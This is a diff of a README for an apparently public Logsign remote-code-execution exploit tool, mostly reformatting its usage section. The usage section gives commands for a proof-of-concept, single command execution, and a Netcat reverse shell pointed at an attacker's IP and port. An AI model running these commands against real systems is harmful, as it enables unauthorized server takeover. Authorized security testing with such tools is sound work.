@@ -29,7 +29,6 @@ By combining these vulnerabilities, an attacker can gain full control over the t
 **Clone the project files:**
 
 ```
-bash
 git clone https://github.com/sevbandonmez/logsign-rce.git
 cd logsign-rce
 ```
@@ -60,35 +59,36 @@ options:
   -d, --debug           Enable debug logging
 ```
 
-## Example 1: Default PoC
+### Example 1: Default PoC
 This mode creates a file /tmp/logsign_pwned.txt on the target system to prove the vulnerability.
 
 ```python3 exploit.py -t https://192.168.1.100```
 
-Check the file on the target system: cat /tmp/logsign_pwned.txt.Example 2: Single Command ExecutionRun a single command, such as whoami, on the target system:bash
+Check the file on the target system: cat /tmp/logsign_pwned.txt.
+### Example 2: Single Command ExecutionRun a single command, such as whoami, on the target system:
 
 ```python3 exploit.py -t https://192.168.1.100 -c "whoami"```
 
-## Example 3: Reverse Shell
+### Example 3: Reverse Shell
 This mode provides an interactive command-line shell on the target system.
 
-**Step 1:* Start a listener on the attacker's machine using Netcat:bash**
+**Step 1:* Start a listener on the attacker's machine using Netcat:**
 
 ```nc -lvnp 4444```
 
-**Step 2:* Run the exploit, specifying your IP address and port:bash**
+**Step 2:* Run the exploit, specifying your IP address and port:**
 
 ```python3 exploit.py -t https://192.168.1.100 -rh 192.168.1.20 -rp 4444```
 
 If successful, a shell session will appear in your Netcat listener.
 
 ## Debugging
-If the script fails or produces unexpected errors, enable detailed logging with the --debug flag:bash
+If the script fails or produces unexpected errors, enable detailed logging with the --debug flag:
 
 ```python3 exploit.py -t https://192.168.1.100 -rh 192.168.1.20 -rp 4444 --debug```
 
 ## Special Thanks
-Endless thanks to @mdisec for the identified CVE vulnerabilities. 
+Endless thanks to **@mdisec** for the identified CVE vulnerabilities <3. 
 
 ## Legal Disclaimer
 This tool is developed solely for authorized security testing and educational purposes. Unauthorized use of this tool for illegal activities is strictly prohibited. Any damage or legal consequences resulting from the use of this tool are the sole responsibility of the user. The developer is not liable for any misuse of this tool.
